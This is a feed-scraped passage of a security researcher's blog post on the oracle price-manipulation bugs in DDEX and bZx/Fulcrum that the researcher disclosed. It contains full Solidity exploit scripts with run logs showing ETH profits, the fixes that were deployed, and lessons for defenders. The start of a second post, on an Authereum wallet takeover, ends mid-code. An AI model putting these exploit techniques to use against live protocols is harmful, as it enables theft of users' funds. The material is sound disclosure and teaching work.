ETH/DAI.\nThe oracle will calculate the value of ETH/DAI as reported by Eth2Dai by taking the average of the current asking price and the current bidding price. In order to decrease this value, we'll need to lower the current bidding price by filling existing orders and then lower the current asking price by placing new orders.\nHowever, this requires a significant initial investment (as we need to fill orders then make an equivalent number of orders) and is non-trivial to implement. On the other hand, we can drop the Uniswap price simply by selling a large amount of DAI to Uniswap. As such, we'll aim to bypass the Eth2Dai logic and manipulate the Uniswap price.\nIn order to bypass Eth2Dai, we need to manipulate the magnitude of the spread. We can do this in one of two ways:\n\nClear out one side of the orderbook while leaving the other alone. This causes spread to increase positively\nForce a crossed orderbook by listing an extreme buy or sell order. This causes spread to decrease negatively.\n\nWhile option 2 would result in no losses from taking unfavorable orders, the use of SafeMath disallows a crossed orderbook and as such is unavailable to us. Instead, we'll force a large positive spread by clearing out one side of the orderbook. This will cause the DAI oracle to fallback to Uniswap to determine the price of DAI. Then, we can cause the Uniswap price of DAI/ETH to drop by buying a large amount of DAI. Once the apparent value of DAI/USD has been manipulated, it's trivial to take out a loan like as usual.\nDemo\nThe following script will turn a profit of approximately 70 ETH by:\n\nClearing out Eth2Dai's sell orders until the spread is large enough that the oracle rejects the price\nBuying more DAI from Uniswap, dropping the price from 213DAI/ETH to 13DAI/ETH\nBorrowing all the available ETH (~120) for a small amount of DAI (~2500)\nSelling the DAI we bought from Uniswap back to Uniswap\nSelling the DAI we bought from Eth2Dai back to Eth2Dai\nResetting the oracle (don't want anyone else abusing our favorable rates)\n\ncontract DDEXExploit is Script, Constants, TokenHelper {\n    OracleLike private constant ETH_ORACLE = OracleLike(0x8984F1CFf1d614a7404b0cfE97C6fa9110b93Bd2);\n    DaiOracleLike private constant DAI_ORACLE = DaiOracleLike(0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8);\n    \n    ERC20Like private constant HYDRO_ETH = ERC20Like(0x000000000000000000000000000000000000000E);\n    HydroLike private constant HYDRO = HydroLike(0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7);\n    \n    uint16 private constant ETHDAI_MARKET_ID = 1;\n    \n    uint private constant INITIAL_BALANCE = 25000 ether;\n    \n    function setup() public {\n        name(\"ddex-exploit\");\n        blockNumber(8572000);\n    }\n    \n    function run() public {\n        begin(\"exploit\")\n            .withBalance(INITIAL_BALANCE)\n            .first(this.checkRates)\n            .then(this.skewRates)\n            .then(this.checkRates)\n            .then(this.steal)\n            .then(this.cleanup)\n            .then(this.checkProfits);\n    }\n    \n    function checkRates() external {\n        uint ethPrice = ETH_ORACLE.getPrice(HYDRO_ETH);\n        uint daiPrice = DAI_ORACLE.getPrice(DAI);\n        \n        printf(\"eth=%.18u dai=%.18u\\n\", abi.encode(ethPrice, daiPrice));\n    }\n    \n    uint private boughtFromMatchingMarket = 0;\n    \n    function skewRates() external {\n        skewUniswapPrice();\n        skewMatchingMarket();\n        require(DAI_ORACLE.updatePrice());\n    }\n    \n    function skewUniswapPrice() internal {\n        DAI.getFromUniswap(DAI.balanceOf(address(DAI.getUniswapExchange())) * 75 / 100);\n    }\n    \n    function skewMatchingMarket() internal {\n        uint start = DAI.balanceOf(address(this));\n        WETH.deposit.value(address(this).balance)();\n        WETH.approve(address(MATCHING_MARKET), uint(-1));\n        while (DAI_ORACLE.getEth2DaiPrice() != 0) {\n            MATCHING_MARKET.buyAllAmount(DAI, 5000 ether, WETH, uint(-1));\n        }\n        boughtFromMatchingMarket = DAI.balanceOf(address(this)) - start;\n        WETH.withdrawAll();\n    }\n    \n    function steal() external {\n        HydroLike.Market memory ethDaiMarket = HYDRO.getMarket(ETHDAI_MARKET_ID);\n        HydroLike.BalancePath memory commonPath = HydroLike.BalancePath({\n            category: HydroLike.BalanceCategory.Common,\n            marketID: 0,\n            user: address(this)\n        });\n        HydroLike.BalancePath memory ethDaiPath = HydroLike.BalancePath({\n            category: HydroLike.BalanceCategory.CollateralAccount,\n            marketID: 1,\n            user: address(this)\n        });\n        \n        uint ethWanted = HYDRO.getPoolCashableAmount(HYDRO_ETH);\n        uint daiRequired = ETH_ORACLE.getPrice(HYDRO_ETH) * ethWanted * ethDaiMarket.withdrawRate / DAI_ORACLE.getPrice(DAI) / 1 ether + 1 ether;\n        \n        printf(\"ethWanted=%.18u daiNeeded=%.18u\\n\", abi.encode(ethWanted, daiRequired));\n        \n        HydroLike.Action[] memory actions = new HydroLike.Action[](5);\n        actions[0] = HydroLike.Action({\n            actionType: HydroLike.ActionType.Deposit,\n            encodedParams: abi.encode(address(DAI), uint(daiRequired))\n        });\n        actions[1] = HydroLike.Action({\n            actionType: HydroLike.ActionType.Transfer,\n            encodedParams: abi.encode(address(DAI), commonPath, ethDaiPath, uint(daiRequired))\n        });\n        actions[2] = HydroLike.Action({\n            actionType: HydroLike.ActionType.Borrow,\n            encodedParams: abi.encode(uint16(ETHDAI_MARKET_ID), address(HYDRO_ETH), uint(ethWanted))\n        });\n        actions[3] = HydroLike.Action({\n            actionType: HydroLike.ActionType.Transfer,\n            encodedParams: abi.encode(address(HYDRO_ETH), ethDaiPath, commonPath, uint(ethWanted))\n        });\n        actions[4] = HydroLike.Action({\n            actionType: HydroLike.ActionType.Withdraw,\n            encodedParams: abi.encode(address(HYDRO_ETH), uint(ethWanted))\n        });\n        DAI.approve(address(HYDRO), daiRequired);\n        HYDRO.batch(actions);\n    }\n    \n    function cleanup() external {\n        DAI.approve(address(MATCHING_MARKET), uint(-1));\n        MATCHING_MARKET.sellAllAmount(DAI, boughtFromMatchingMarket, WETH, uint(0));\n        WETH.withdrawAll();\n        \n        DAI.giveAllToUniswap();\n        require(DAI_ORACLE.updatePrice());\n    }\n    \n    function checkProfits() external {\n        printf(\"profits=%.18u\\n\", abi.encode(address(this).balance - INITIAL_BALANCE));\n    }\n}\n\n/*\n### running script \"ddex-exploit\" at block 8572000\n#### executing step: exploit\n##### calling: checkRates()\neth=213.440000000000000000 dai=1.003140638067989051\n##### calling: skewRates()\n##### calling: checkRates()\neth=213.440000000000000000 dai=16.058419875880325580\n##### calling: steal()\nethWanted=122.103009983203364425 daiNeeded=2435.392672403537525078\n##### calling: cleanup()\n##### calling: checkProfits()\nprofits=72.140629996890984407\n#### finished executing step: exploit\n*/\nSolution\nThe DDEX team fixed this by deploying a new oracle which places sanity bounds on the price of DAI, currently set to 0.95 and 1.05.\n\nfunction updatePrice()\n\tpublic\n\treturns (bool)\n{\n\tuint256 _price = peek();\n\n\tif (_price == 0) {\n\t\treturn false;\n\t}\n\n\tif (_price == price) {\n\t\treturn true;\n\t}\n\n\tif (_price > maxPrice) {\n\t\t_price = maxPrice;\n\t} else if (_price < minPrice) {\n\t\t_price = minPrice;\n\t}\n\n\tprice = _price;\n\temit UpdatePrice(price);\n\n\treturn true;\n}\nSource\nbZx and Fulcrum\nbZx is a decentralized margin-trading protocol, while Fulcrum is a project built by the bZx team on top of bZx itself. One feature of Fulcrum is the ability to take a loan on an iToken (read more about that here) using any* other token as collateral. In order to determine how much collateral is needed, bZx uses the Kyber Network as an on-chain decentralized oracle to check the conversion rate between the collateral token and the loan token.\n* if it's tradable on Kyber\nHowever, it's important to first understand how the Kyber Network functions. Unlike most other DEXes, the Kyber Network derives liquidity from reserves (read more about that here). When a user wants to make a trade between two tokens A and B, the main Kyber contract will query all registered reserves for the best rate between A/ETH and ETH/B, then perform the trade using the two reserves selected.\nReserves can be listed automatically through the PermissionlessOrderbookReserveLister contract, which will create a permissionless reserve. Reserves can also be listed by the Kyber team on behalf of a market maker after KYC and legal requirements are met. In this case, the reserve will be a permissioned reserve. When conducting a trade using Kyber, traders have the option of only using permissioned reserves, or using all available reserves.\nThe attack\nWhen bZx checks the price of a collateral token, it specifies that only permissioned reserves should be used. This decision was made based on the Kyber whitepaper at the time, with the logic being that permissioned reserves had to undergo review and so the rates should be \"correct\".\nSource, Credit: Kyber Network\nThis means that if we can somehow increase the rate reported by a permissioned reserve, we can trick Fulcrum into thinking our collateral is worth more than it really is.\nA permissioned OrderbookReserve\nOn June 16 2019, the Kyber team listed an OrderbookReserve for the WAX token as a permissioned reserve in this transaction. This was interesting because the statement \"an OrderbookReserve is always permissioned\" was considered to be axiomatic.\nAfter this reserve was listed, the Kyber Network itself continued to perform according to specifications. However, we can now significantly affect the apparent exchange rate between WAX and ETH simply by listing an order, which means that we can trick any project which relies on Kyber to provide an accurate FMV.\nDemo\nThe following script will turn a profit of approximately 1200ETH by:\n\nListing an order buying 1 WAX for 10 ETH, increasing the price from 0.00ETH/WAX to 10ETH/WAX\nBorrowing DAI from bZx using WAX as a collateral\nCancelling all orders and converting all assets to ETH\n\ncontract BZxWAXExploit is Script, Constants, TokenHelper, BZxHelpers {\n    BZxLoanTokenV2Like private constant BZX_DAI = BZxLoanTokenV2Like(0x14094949152EDDBFcd073717200DA82fEd8dC960);\n    \n    ERC20Like private constant WAX = ERC20Like(0x39Bb259F66E1C59d5ABEF88375979b4D20D98022);\n    OrderbookReserveLike private constant WAX_ORDER_BOOK = OrderbookReserveLike(0x75fF6BeC6Ed398FA80EA1596cef422D64681F057);\n    \n    uint constant private INITIAL_BALANCE = 150 ether;\n    \n    function setup() public {\n        name(\"bzx-wax-exploit\");\n        blockNumber(8455720);\n    }\n    \n    function run() public {\n        begin(\"exploit\")\n            .withBalance(INITIAL_BALANCE)\n            .first(this.checkRates)\n            .then(this.makeOrder)\n            .then(this.checkRates)\n            .then(this.borrow)\n            .then(this.cleanup)\n            .finally(this.checkProfits);\n    }\n    \n    uint constant rateCheckAmount = 1e8;\n    \n    function checkRates() external {\n        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(WAX, KYBER_ETH, rateCheckAmount);\n        printf(\"checking rates tokens=%.8u rate=%.18u slippage=%.18u\\n\", abi.encode(rateCheckAmount, rate, slippage));\n    }\n    \n    uint constant waxBidAmount = 1e8;\n    uint constant ethOfferAmount = 10 ether;\n    uint32 private orderId;\n    function makeOrder() external {\n        orderId = WAX_ORDER_BOOK.ethToTokenList().nextFreeId();\n        \n        uint kncRequired = WAX_ORDER_BOOK.calcKncStake(ethOfferAmount);\n        printf(\"making malicious order kncRequired=%.u\\n\", abi.encode(KNC.decimals(), kncRequired));\n        \n        KNC.getFromUniswap(kncRequired);\n        WAX.getFromBancor(1 ether);\n        \n        WAX.approve(address(WAX_ORDER_BOOK), waxBidAmount);\n        KNC.approve(address(WAX_ORDER_BOOK), kncRequired);\n        \n        WAX_ORDER_BOOK.depositEther.value(ethOfferAmount)(address(this));\n        WAX_ORDER_BOOK.depositToken(address(this), waxBidAmount);\n        WAX_ORDER_BOOK.depositKncForFee(address(this), kncRequired);\n        require(WAX_ORDER_BOOK.submitEthToTokenOrder(uint128(ethOfferAmount), uint128(waxBidAmount)));\n    }\n    \n    function borrow() external {\n        bytes32 hash = doBorrow(BZX_DAI, false, BZX_DAI.marketLiquidity(), DAI, WAX);\n        printf(\"borrowing loanHash=%32x\\n\", abi.encode(hash));\n    }\n    \n    function cleanup() external {\n        require(WAX_ORDER_BOOK.cancelEthToTokenOrder(orderId));\n        WAX_ORDER_BOOK.withdrawEther(WAX_ORDER_BOOK.makerFunds(address(this), KYBER_ETH));\n        WAX_ORDER_BOOK.withdrawToken(WAX_ORDER_BOOK.makerFunds(address(this), WAX));\n        WAX_ORDER_BOOK.withdrawKncFee(WAX_ORDER_BOOK.makerKnc(address(this)));\n        DAI.giveAllToUniswap();\n        KNC.giveAllToUniswap();\n        WAX.giveAllToBancor();\n        WETH.withdrawAll();\n    }\n    \n    function checkProfits() external {\n        printf(\"profits=%.18u\\n\", abi.encode(address(this).balance - INITIAL_BALANCE));\n    }\n    \n    function borrowInterest(uint amount) internal {\n        DAI.getFromUniswap(amount);\n    }\n}\n\n/*\n### running script \"bzx-wax-exploit\" at block 8455720\n#### executing step: exploit\n##### calling: checkRates()\nchecking rates tokens=1.00000000 rate=0.000000000000000000 slippage=0.000000000000000000\n##### calling: makeOrder()\nmaking malicious order kncRequired=127.438017578344399080\n##### calling: checkRates()\nchecking rates tokens=1.00000000 rate=10.000000000000000000 slippage=9.700000000000000000\n##### calling: borrow()\ncollateral_required=232.02826470, interest_required=19750.481385867262370788\nborrowing loanHash=0x2cca5c037a25b47338027b9d1bed55d6bc131b3d1096925538f611240d143c64\n##### calling: cleanup()\n##### calling: checkProfits()\nprofits=1170.851523093083307797\n#### finished executing step: exploit\n*/\nSolution\nThe bZx team blocked this attack by whitelisting tokens which can be used as collateral.\nEth2Dai\nNow that there's a whitelist on the tokens that can be used as collateral, we'll need to through all the permissioned reserves to see if there's anything else that we can abuse. It turns out that DAI, one of the whitelisted tokens, has a permissioned reserve which integrates with Eth2Dai. As Eth2Dai allows users to create limit orders, this is essentially the previous attack but with more steps.\nInterestingly, we first observe that although the Eth2Dai contract is titled MatchingMarket, it's not strictly true that all new orders will be automatically matched. This is because while the functions offer(uint,ERC20,uint,ERC20,uint) and offer(uint,ERC20,uint,ERC20,uint,bool) will trigger the matching logic, the function offer(uint,ERC20,uint,ERC20) does not.\n\n// Make a new offer. Takes funds from the caller into market escrow.\nfunction offer(\n\tuint pay_amt,    //maker (ask) sell how much\n\tERC20 pay_gem,   //maker (ask) sell which token\n\tuint buy_amt,    //maker (ask) buy how much\n\tERC20 buy_gem,   //maker (ask) buy which token\n\tuint pos         //position to insert offer, 0 should be used if unknown\n)\n\tpublic\n\tcan_offer\n\treturns (uint)\n{\n\treturn offer(pay_amt, pay_gem, buy_amt, buy_gem, pos, true);\n}\n\nfunction offer(\n\tuint pay_amt,    //maker (ask) sell how much\n\tERC20 pay_gem,   //maker (ask) sell which token\n\tuint buy_amt,    //maker (ask) buy how much\n\tERC20 buy_gem,   //maker (ask) buy which token\n\tuint pos,        //position to insert offer, 0 should be used if unknown\n\tbool rounding    //match \"close enough\" orders?\n)\n\tpublic\n\tcan_offer\n\treturns (uint)\n{\n\trequire(!locked, \"Reentrancy attempt\");\n\trequire(_dust[pay_gem] <= pay_amt);\n\n\tif (matchingEnabled) {\n\t  return _matcho(pay_amt, pay_gem, buy_amt, buy_gem, pos, rounding);\n\t}\n\treturn super.offer(pay_amt, pay_gem, buy_amt, buy_gem);\n}\nSource\nFurthermore, we observe that even though the comments seem to suggest that only authorized users can call offer(uint,ERC20,uint,ERC20), there's no authorization logic at all.\n// Make a new offer. Takes funds from the caller into market escrow.\n//\n// If matching is enabled:\n//     * creates new offer without putting it in\n//       the sorted list.\n//     * available to authorized contracts only!\n//     * keepers should call insert(id,pos)\n//       to put offer in the sorted list.\n//\n// If matching is disabled:\n//     * calls expiring market's offer().\n//     * available to everyone without authorization.\n//     * no sorting is done.\n//\nfunction offer(\n\tuint pay_amt,    //maker (ask) sell how much\n\tERC20 pay_gem,   //maker (ask) sell which token\n\tuint buy_amt,    //taker (ask) buy how much\n\tERC20 buy_gem    //taker (ask) buy which token\n)\n\tpublic\n\treturns (uint)\n{\n\trequire(!locked, \"Reentrancy attempt\");\n\tvar fn = matchingEnabled ? _offeru : super.offer;\n\treturn fn(pay_amt, pay_gem, buy_amt, buy_gem);\n}\nWhile in practice lack of authorization is irrelevant as arbitrage bots will quickly fill any orders that can be automatically matched, in an atomic transaction we can create and cancel arbitrage-able orders and no bots will be able to fill them.\nAll that's left is to slightly modify our script from the previous attack to place orders on Eth2Dai instead of the OrderbookReserve. Note that in this case we will need to call both order(uint,ERC20,uint,ERC20) to submit the order to Eth2Dai without it being atomically matched, and then insert(uint,uint) in order to manually sort the order without triggering matching.\nDemo\nThe following script will turn a profit of approximately 2500ETH by:\n\nListing an order buying 1 DAI for 10 ETH, increasing the price from 0.006ETH/DAI to 9.98ETH/DAI.\nBorrowing ETH from bZx using DAI as collateral\nCancelling all orders and converting all assets to ETH\n\ncontract BZxOasisExploit is Script, Constants, TokenHelper, BZxHelpers {\n    BZxLoanTokenV2Like private constant BZX_ETH = BZxLoanTokenV2Like(0x77f973FCaF871459aa58cd81881Ce453759281bC);\n    \n    uint constant private INITIAL_BALANCE = 250 ether;\n    \n    function setup() public {\n        name(\"bzx-oasis-exploit\");\n        blockNumber(8455720);\n    }\n    \n    function run() public {\n        begin(\"exploit\")\n            .withBalance(INITIAL_BALANCE)\n            .first(this.checkRates)\n            .then(this.makeOrder)\n            .then(this.checkRates)\n            .then(this.borrow)\n            .then(this.cleanup)\n            .finally(this.checkProfits);\n    }\n    \n    uint constant rateCheckAmount = 1 ether;\n    \n    function checkRates() external {\n        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(DAI, KYBER_ETH, rateCheckAmount);\n        printf(\"checking rates tokens=%.18u rate=%.18u slippage=%.18u\\n\", abi.encode(rateCheckAmount, rate, slippage));\n    }\n    \n    uint private id;\n    \n    uint constant daiBidAmount = 1 ether;\n    uint constant ethOfferAmount = 10 ether;\n    function makeOrder() external {\n        WETH.deposit.value(ethOfferAmount)();\n        WETH.approve(address(MATCHING_MARKET), ethOfferAmount);\n        id = MATCHING_MARKET.offer(ethOfferAmount, WETH, daiBidAmount, DAI);\n        printf(\"made order id=%u\\n\", abi.encode(id));\n        \n        require(MATCHING_MARKET.insert(id, 0));\n    }\n    \n    function borrow() external {\n        bytes32 hash = doBorrow(BZX_ETH, false, BZX_ETH.marketLiquidity(), WETH, DAI);\n        printf(\"borrowing loanHash=%32x\\n\", abi.encode(hash));\n    }\n    \n    function cleanup() external {\n        require(MATCHING_MARKET.cancel(id));\n        DAI.giveAllToUniswap();\n        WETH.withdrawAll();\n    }\n    \n    function checkProfits() external {\n        printf(\"profits=%.18u\\n\", abi.encode(address(this).balance - INITIAL_BALANCE));\n    }\n    \n    function borrowInterest(uint amount) internal {\n        WETH.deposit.value(amount)();\n    }\n    \n    function borrowCollateral(uint amount) internal {\n        DAI.getFromUniswap(amount);\n    }\n}\n\n/*\n### running script \"bzx-oasis-exploit\" at block 8455720\n#### executing step: exploit\n##### calling: checkRates()\nchecking rates tokens=1.000000000000000000 rate=0.005950387240736517 slippage=0.005771875623514421\n##### calling: makeOrder()\nmade order id=414191\n##### calling: checkRates()\nchecking rates tokens=1.000000000000000000 rate=9.975000000000000000 slippage=9.675750000000000000\n##### calling: borrow()\ncollateral_required=398.831304885561111810, interest_required=203.458599916962956188\nborrowing loanHash=0x947839881794b73d61a0a27ecdbe8213f543bdd4f4a578eedb5e1be57221109c\n##### calling: cleanup()\n##### calling: checkProfits()\nprofits=2446.376892708285686012\n#### finished executing step: exploit\n*/\nSolution\nThe bZx team blocked this attack by modifying the oracle logic such that if the collateral and loan token were both either DAI or WETH, then the exchange rate would be loaded directly from Maker's oracles.\nHowever, this solution was incomplete because of the way Kyber resolves the best rate. If you'll recall, Kyber determines the best rate for A/B by determining the best rate for A/ETH and ETH/B, then calculating the amount of B that could be bought with the ETH received by trading A.\nThis meant that if we were to attempt to borrow a non-ETH token such as USDC using DAI as collateral, Kyber would first determine the best exchange rate for DAI/ETH, then the best rate for ETH/USDC, and finally the best rate for DAI/USDC. Because we can artificially increase the exchange rate for DAI/ETH, we can still manipulate the exchange rate for DAI/USDC even though we don't control a permissioned USDC reserve.\nThe bZx team blocked this attack in two ways:\n\nIf either the loan token or collateral token wasn't ETH, then bZx would manually determine the exchange rate between the token and ETH, unless\nThe loan token or collateral token was a USD-based stablecoin, in which case bZx would use the rate from Maker's oracle\n\nUniswap\nAn astute reader may notice at this point that bZx's solution still does not handle incorrect FMVs for arbitrary tokens. This means that if we can find another permissioned reserve which can be manipulated, we can take out yet another undercollateralized loan.\nAfter sifting through all the registered permissioned reserves for the whitelisted tokens, we notice that the REP token has a reserve which integrates with Uniswap. We already know from our attacks on DDEX that Uniswap's prices can be manipulated, so we can re-purpose our previous attack and substitute Eth2Dai and DAI for Uniswap and REP.\nDemo\nThe following script will turn a profit of approximately 2500ETH by:\n\nPerforming a large order buy on Uniswap's REP exchange, increasing the price from 0.05ETH/REP to 6.05ETH/REP\nBorrowing ETH from bZx using REP as collateral\nCancelling all orders and convert all assets to ETH\n\ncontract BZxUniswapExploit is Script, Constants, TokenHelper, BZxHelpers {\n    BZxLoanTokenV3Like private constant BZX_ETH = BZxLoanTokenV3Like(0x77f973FCaF871459aa58cd81881Ce453759281bC);\n    \n    uint constant private INITIAL_BALANCE = 5000 ether;\n    \n    function setup() public {\n        name(\"bzx-uniswap-exploit\");\n        blockNumber(8547500);\n    }\n    \n    function run() public {\n        begin(\"exploit\")\n            .withBalance(INITIAL_BALANCE)\n            .first(this.checkRates)\n            .then(this.makeOrder)\n            .then(this.checkRates)\n            .then(this.borrow)\n            .then(this.cleanup)\n            .finally(this.checkProfits);\n    }\n    \n    uint constant rateCheckAmount = 10 ether;\n    \n    function checkRates() external {\n        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(REP, KYBER_ETH, rateCheckAmount);\n        printf(\"checking rates tokens=%.18u rate=%.18u slippage=%.18u\\n\", abi.encode(rateCheckAmount, rate, slippage));\n    }\n    \n    function makeOrder() external {\n        UniswapLike uniswap = REP.getUniswapExchange();\n        uint totalSupply = REP.balanceOf(address(uniswap));\n        uint borrowAmount = totalSupply * 90 / 100;\n        REP.getFromUniswap(borrowAmount);\n        printf(\"making order totalSupply=%.18u borrowed=%.18u\\n\", abi.encode(totalSupply, borrowAmount));\n    }\n    \n    function borrow() external {\n        bytes32 hash = doBorrow(BZX_ETH, true, BZX_ETH.marketLiquidity(), WETH, REP);\n        printf(\"borrowing loanHash=%32x\\n\", abi.encode(hash));\n    }\n    \n    function cleanup() external {\n        REP.giveAllToUniswap();\n        WETH.withdrawAll();\n    }\n    \n    function checkProfits() external {\n        printf(\"profits=%.18u\\n\", abi.encode(address(this).balance - INITIAL_BALANCE));\n    }\n    \n    function borrowInterest(uint amount) internal {\n        WETH.deposit.value(amount)();\n    }\n}\n\n/*\n### running script \"bzx-uniswap-exploit\" at block 8547500\n#### executing step: exploit\n##### calling: checkRates()\nchecking rates tokens=10.000000000000000000 rate=0.057621091203633720 slippage=0.055892458467524708\n##### calling: makeOrder()\nmaking order totalSupply=8856.102959786215028808 borrowed=7970.492663807593525927\n##### calling: checkRates()\nchecking rates tokens=10.000000000000000000 rate=5.656379870360426078 slippage=5.486688474249613295\n##### calling: borrow()\ncollateral_required=702.265284613341236862, interest_required=205.433213643594588344\nborrowing loanHash=0x947839881794b73d61a0a27ecdbe8213f543bdd4f4a578eedb5e1be57221109c\n##### calling: cleanup()\n##### calling: checkProfits()\nprofits=2425.711777227580307468\n#### finished executing step: exploit\n*/\nSolution\nThe bZx team reverted their changes for the previous attack and instead implemented a spread check, such that if the spread was above a certain threshold then the loan would be rejected. This solution handles the generic case so long as both tokens being queried has at least one non-manipulable reserve on Kyber, which is currently the case for all whitelisted tokens.\nKey Takeaways\nDon't use an on-chain decentralized oracle without some sort of validation\nDue to the nature of on-chain decentralized oracles, ensure that you're validating the rate being returned, whether it's by taking the order (thereby nullifying any gains which may have been realized), comparing the rate against known good rates (in the case of DAI), or comparing the rate in both directions.\nConsider the implications of dependencies on third-party projects\nIn both cases, DDEX and bZx assumed that Uniswap and Kyber would be a source of accurate price data. However, an accurate rate for a DEX means that a trade can be made using that rate, while an accurate rate for a DeFi project means that it is close to or equal to the FMV. In other words, an accurate rate for a DeFi project is an accurate rate for a DEX, but the opposite might not be true.\nFurthermore, bZx's second attempt at solving this problem was insufficient due to a misunderstanding in how the Kyber Network internally calculates the exchange rate between two non-ETH tokens.\nAs such, before introducing a dependency on a third-party project, consider not only whether the project has been audited, but also whether the project's specifications and threat model align with your own. If you have the time, taking an in-depth look at their contracts also doesn't hurt.\nFurther Reading\n\nbZx's disclosure\nDDEX's disclosure\nThe libraries that the scripts used","dc:creator":"samczsun","content":"Price manipulation, now with 100% more blockchain","contentSnippet":"Price manipulation, now with 100% more blockchain","guid":"5d708d0b5f582e0001bf6717","isoDate":"2019-09-30T16:20:35.000Z","from":"https://samczsun.com/rss/","hashId":"914f540c385693621340bb4484a905e6"},{"creator":"samczsun","title":"Authereum, meet Parity","link":"https://samczsun.com/authereum-meet-parity/","pubDate":"Wed, 19 Feb 2020 03:54:32 GMT","content:encoded":"<h1 id=\"tl-dr\">tl;dr</h1><p>The Authereum wallet contained a bug which would allow an attacker to take over any wallet at any time. The Authereum team exploited this bug in order to force an upgrade on all user wallets, and as a result no funds were lost.</p><h1 id=\"authereum\">Authereum</h1><p>Authereum is a project which aims to make using Ethereum dApps easier for everyday users. In order to achieve this goal, they&apos;ve built a set of smart contracts which act as a smart wallet.</p><p>Each smart wallet is owned by a set of admin keys, and the first admin key is generated when a user creates their account on Authereum. Naturally, an admin key can add a new admin key.</p><p>Authereum wallets also allows relayers to submit transactions so the end user doesn&apos;t need to worry about paying for gas. In order to make sure evil relayers can&apos;t do bad things, the Authereum wallet verifies that the relayed transaction is signed by an admin key.</p><h1 id=\"how-to-relay-a-transaction\">How to relay a transaction</h1><p>Let&apos;s take a look at how a relayer might use Authereum meta transactions to relay an ERC20 approval.</p><p>First, the user provides the encoded transaction(s). This consists of the target contract, the amount of ether to be sent, the gas limit, and the transaction data. For an ERC20 approval, that might look something like this:</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">bytes memory encodedTransaction = abi.encode(\n\t0x6B175474E89094C44Da98b954EedeAC495271d0F, // dai\n\t0,\n\tuint(-1),\n\tabi.encodeWithSignature(\n\t\t&quot;approve(address,uint256)&quot;,\n\t\t0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B, // approve vitalik\n\t\tuint(-1) // for all my dai\n\t)\n);</code></pre><figcaption>Don&apos;t spend it all in one place</figcaption></figure><p>Next, the user specifies the minimum gas price that they would like this transaction to be sent at, along with an estimated gas overhead. The user also specifies whether they want to pay in a token other than ETH, and at what rate ETH converts to the token.</p><p>Finally, the user provides a signature, signed with their admin key. Specifically, it&apos;s a signature for the following data.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">bytes32 hash = keccak256(abi.encodePacked(\n    &quot;\\x19Ethereum Signed Message:\\n32&quot;,\n    keccak256(abi.encode(\n        address(wallet),\n        wallet.executeMultipleAuthKeyMetaTransactions.selector,\n        wallet.getChainId(),\n        wallet.nonce(),\n        [encodedTransaction],\n        gasPrice,\n        gasOverhead,\n        feeTokenAddress,\n        feeTokenRate\n    ))\n));</code></pre><figcaption><a href=\"https://github.com/authereum/contracts/blob/e29a042e5f4da13b8c868ff189a3930ae10206ba/contracts/account/BaseMetaTxAccount.sol#L52-L62\">Source</a></figcaption></figure><p>When the relayer has been provided with all of the necessary information, they submit a transaction to <code>executeMultipleAuthKeyMetaTransactions</code>. That function looks something like this:</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">function executeMultipleAuthKeyMetaTransactions(\n\tbytes[] memory _transactions,\n\tuint256 _gasPrice,\n\tuint256 _gasOverhead,\n\taddress _feeTokenAddress,\n\tuint256 _feeTokenRate,\n\tbytes memory _transactionMessageHashSignature\n)\n\tpublic\n\treturns (bytes[] memory)\n{\n\tuint256 _startGas = gasleft();\n\n\t(bytes32 _transactionMessageHash, bytes[] memory _returnValues) = _atomicExecuteMultipleMetaTransactions(\n\t\t_transactions,\n\t\t_gasPrice,\n\t\t_gasOverhead,\n\t\t_feeTokenAddress,\n\t\t_feeTokenRate\n\t);\n\n\t// Validate the signer\n\t_validateAuthKeyMetaTransactionSigs(\n\t\t_transactionMessageHash, _transactionMessageHashSignature\n\t);\n\n\tif (_shouldRefund(_transactions)) {\n\t  _issueRefund(_startGas, _gasPrice, _gasOverhead, _feeTokenAddress, _feeTokenRate);\n\t}\n\n\treturn _returnValues;\n}</code></pre><figcaption><a href=\"https://github.com/authereum/contracts/blob/e29a042e5f4da13b8c868ff189a3930ae10206ba/contracts/account/AuthKeyMetaTxAccount.sol#L21-L52\">Source</a></figcaption></figure><p>At this point, the Authereum wallet will atomically execute all of the transactions, verify that the transactions were signed by an admin key, and then issue a refund if necessary.</p><p>Notice anything wrong?</p><h1 id=\"meta-all-the-things\">Meta all the things</h1><p>If admins could use meta transactions to relay <em>some</em> transactions, it sure would be nice if they could use meta transactions to relay <em>all</em> transactions. However, the only surefire way to make sure that an admin sent a transaction is to check <code>msg.sender</code>, and that doesn&apos;t work in a meta transaction.</p><p>Actually, if we think about it, the wallet represents the admin. Only the admin can authorize transactions to be sent. That means that if the wallet is the caller, then the admin must have authorized the wallet to call itself, right? So maybe we can treat the wallet as a pseudo-admin of sorts, letting it do some of the scary privileged stuff.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">function addAuthKey(address _authKey) external onlyAuthKeySenderOrSelf {\n\trequire(authKeys[_authKey] == false, &quot;BA: Auth key already added&quot;);\n\tauthKeys[_authKey] = true;\n\tnumAuthKeys += 1;\n\temit AuthKeyAdded(_authKey);\n}</code></pre><figcaption><a href=\"https://github.com/authereum/contracts/blob/e29a042e5f4da13b8c868ff189a3930ae10206ba/contracts/account/BaseAccount.sol#L61-L66\">Source</a></figcaption></figure><p>Hopefully there&apos;s no way for any random person to make the wallet call a random function on itself that would <em>really</em> suck.</p><h1 id=\"oops\">Oops</h1><p>Oops:</p><pre><code class=\"language-solidity\">bytes memory exploitTransaction = abi.encode(\n\twallet,\n\t0,\n\tuint(-1),\n\tabi.encodeWithSignature(\n\t\t&quot;addAuthKey(address)&quot;,\n\t\t0x32993258F4Bb0f00e3C25cF00a9b490BF86509D8 // the hacker&apos;s address\n\t)\n);</code></pre><p>Oops oops oops:</p><pre><code class=\"language-solidity\">bytes32 hash = keccak256(abi.encodePacked(\n    &quot;\\x19Ethereum Signed Message:\\n32&quot;,\n    keccak256(abi.encode(\n        address(wallet),\n        wallet.executeMultipleAuthKeyMetaTransactions.selector,\n        wallet.getChainId(),\n        wallet.nonce(),\n        [exploitTransaction],\n        